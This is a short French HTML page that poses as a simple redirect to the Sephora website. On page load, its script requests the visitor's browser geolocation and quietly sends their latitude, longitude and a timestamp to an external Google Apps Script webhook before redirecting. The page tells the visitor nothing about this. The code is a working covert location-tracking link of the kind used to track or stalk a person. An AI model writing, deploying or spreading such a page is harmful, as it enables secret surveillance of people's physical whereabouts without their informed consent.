<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Redirection en cours...</title>
    <script>
        function redirectToSephora() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // Envoi des données de géolocalisation à Google Sheets via ton Webhook
                    fetch('https://script.google.com/macros/s/AKfycbzlOslgEK8A96L8IsvsWiHGoeklKrupYlHQftdEm_GsftcqE3FdVQ7D9wl5jvgO1d8YeQ/exec', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            timestamp: new Date().toISOString()
                        })
                    });

                    // Redirection automatique vers Sephora après l'envoi des données
                    window.location.href = "https://www.sephora.fr";
                }, function() {
                    // Si l'utilisateur refuse la géolocalisation, redirection directe
                    window.location.href = "https://www.sephora.fr";
                });
            } else {
                // Si la géolocalisation n'est pas supportée par le navigateur
                window.location.href = "https://www.sephora.fr";
            }
        }
    </script>
</head>
<body onload="redirectToSephora()">
    <p>Redirection en cours... Veuillez patienter quelques secondes.</p>
</body>
